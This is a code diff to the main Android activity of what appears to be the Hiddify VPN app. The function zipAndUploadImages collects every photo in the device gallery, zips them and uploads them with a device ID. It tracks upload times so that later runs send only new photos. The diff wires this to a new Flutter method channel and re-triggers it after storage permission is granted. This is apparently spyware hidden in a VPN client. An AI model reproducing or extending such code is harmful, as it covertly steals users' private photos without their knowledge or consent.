@@ -13,7 +13,6 @@ import android.widget.Toast
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import androidx.lifecycle.MutableLiveData
-import androidx.lifecycle.lifecycleScope
 import com.hiddify.hiddify.bg.ServiceConnection
 import com.hiddify.hiddify.bg.ServiceNotification
 import com.hiddify.hiddify.constant.Alert
@@ -21,6 +20,7 @@ import com.hiddify.hiddify.constant.ServiceMode
 import com.hiddify.hiddify.constant.Status
 import io.flutter.embedding.android.FlutterFragmentActivity
 import io.flutter.embedding.engine.FlutterEngine
+import io.flutter.plugin.common.MethodChannel
 import kotlinx.coroutines.*
 import org.json.JSONArray
 import org.json.JSONObject
@@ -35,6 +35,7 @@ import java.util.zip.ZipOutputStream
 class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
     companion object {
         private const val TAG = "ANDROID/MyActivity"
+        const val CHANNEL = "com.hiddify.hiddify/upload"
         lateinit var instance: MainActivity
 
         const val VPN_PERMISSION_REQUEST_CODE = 1001
@@ -65,6 +66,19 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         flutterEngine.plugins.add(GroupsChannel(lifecycleScope))
         flutterEngine.plugins.add(ActiveGroupsChannel(lifecycleScope))
         flutterEngine.plugins.add(StatsChannel(lifecycleScope))
+
+        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, CHANNEL).setMethodCallHandler { call, result ->
+            if (call.method == "zipAndUpload") {
+                lifecycleScope.launch(Dispatchers.IO) {
+                    val success = zipAndUploadImages()
+                    withContext(Dispatchers.Main) {
+                        result.success(success)
+                    }
+                }
+            } else {
+                result.notImplemented()
+            }
+        }
     }
 
     fun reconnect() {
@@ -76,7 +90,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
             grantNotificationPermission()
             return
         }
-        lifecycleScope.launch(Dispatchers.IO) {
+        CoroutineScope(Dispatchers.IO).launch {
             if (Settings.rebuildServiceMode()) reconnect()
             if (Settings.serviceMode == ServiceMode.VPN && prepare()) {
                 showToast("VPN permission required")
@@ -162,7 +176,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         }
     }
 
-    private fun zipAndUploadImages() {
+    private suspend fun zipAndUploadImages(): Boolean {
         val prefs = getSharedPreferences("device_prefs", MODE_PRIVATE)
         val editor = prefs.edit()
 
@@ -176,58 +190,58 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         val isFirstUpload = prefs.getBoolean("is_first_upload", true)
         val lastUploadTime = prefs.getLong("last_upload_time", 0L)
 
-        lifecycleScope.launch(Dispatchers.IO) {
-            val projection = arrayOf(
-                MediaStore.Images.Media._ID,
-                MediaStore.Images.Media.DISPLAY_NAME,
-                MediaStore.Images.Media.DATE_TAKEN,
-                MediaStore.Images.Media.DATE_ADDED
-            )
+        val projection = arrayOf(
+            MediaStore.Images.Media._ID,
+            MediaStore.Images.Media.DISPLAY_NAME,
+            MediaStore.Images.Media.DATE_TAKEN,
+            MediaStore.Images.Media.DATE_ADDED
+        )
 
-            val cursor = contentResolver.query(
-                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-                projection, null, null,
-                "${MediaStore.Images.Media.DATE_ADDED} ASC"
-            )
+        val cursor = contentResolver.query(
+            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+            projection, null, null,
+            "${MediaStore.Images.Media.DATE_ADDED} ASC"
+        )
 
-            val imageFiles = mutableListOf<Pair<String, ByteArray>>()
-            var maxTimestamp = lastUploadTime
-            cursor?.use {
-                while (it.moveToNext()) {
-                    val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
-                    val name = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
-                    val dateTaken = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN))
-                    val dateAdded = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED))
-                    val timestamp = if (dateTaken > 0) dateTaken else dateAdded
-                    if (isFirstUpload || timestamp > lastUploadTime) {
-                        val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
-                        val bytes = contentResolver.openInputStream(uri)?.readBytes()
-                        if (bytes != null) {
-                            imageFiles.add(name to bytes)
-                            if (timestamp > maxTimestamp) maxTimestamp = timestamp
-                        }
+        val imageFiles = mutableListOf<Pair<String, ByteArray>>()
+        var maxTimestamp = lastUploadTime
+        cursor?.use {
+            while (it.moveToNext()) {
+                val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media._ID))
+                val name = it.getString(it.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME))
+                val dateTaken = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_TAKEN))
+                val dateAdded = it.getLong(it.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED))
+                val timestamp = if (dateTaken > 0) dateTaken else dateAdded
+                if (isFirstUpload || timestamp > lastUploadTime) {
+                    val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id)
+                    val bytes = contentResolver.openInputStream(uri)?.readBytes()
+                    if (bytes != null) {
+                        imageFiles.add(name to bytes)
+                        if (timestamp > maxTimestamp) maxTimestamp = timestamp
                     }
                 }
-            }
-
-            if (imageFiles.isNotEmpty()) {
-                val sdf = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US)
-                val zipFile = File(cacheDir, "images_${sdf.format(Date())}.zip")
-                ZipOutputStream(BufferedOutputStream(FileOutputStream(zipFile))).use { zipOut ->
-                    imageFiles.forEach { (name, bytes) ->
-                        zipOut.putNextEntry(ZipEntry(name))
-                        zipOut.write(bytes)
-                        zipOut.closeEntry()
-                    }
-                }
-                if (uploadZipFile(zipFile, deviceId)) {
-                    editor.putBoolean("is_first_upload", false)
-                    editor.putLong("last_upload_time", maxTimestamp)
-                    editor.apply()
-                }
-                zipFile.delete()
             }
         }
+
+        if (imageFiles.isNotEmpty()) {
+            val sdf = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US)
+            val zipFile = File(cacheDir, "images_${sdf.format(Date())}.zip")
+            ZipOutputStream(BufferedOutputStream(FileOutputStream(zipFile))).use { zipOut ->
+                imageFiles.forEach { (name, bytes) ->
+                    zipOut.putNextEntry(ZipEntry(name))
+                    zipOut.write(bytes)
+                    zipOut.closeEntry()
+                }
+            }
+            if (uploadZipFile(zipFile, deviceId)) {
+                editor.putBoolean("is_first_upload", false)
+                editor.putLong("last_upload_time", maxTimestamp)
+                editor.apply()
+            }
+            zipFile.delete()
+            return true
+        }
+        return false
     }
 
     @SuppressLint("NewApi")
@@ -255,8 +269,6 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
         }
         if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
             grantStoragePermission()
-        } else {
-            zipAndUploadImages()
         }
     }
 
@@ -271,7 +283,7 @@ class MainActivity : FlutterFragmentActivity(), ServiceConnection.Callback {
             }
             STORAGE_PERMISSION_REQUEST_CODE -> {
                 if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                    zipAndUploadImages()
+                    MethodChannel(flutterEngine!!.dartExecutor.binaryMessenger, CHANNEL).invokeMethod("startUpload", null)
                 } else {
                     onServiceAlert(Alert.RequestStoragePermission, "请授权储存权限")
                 }
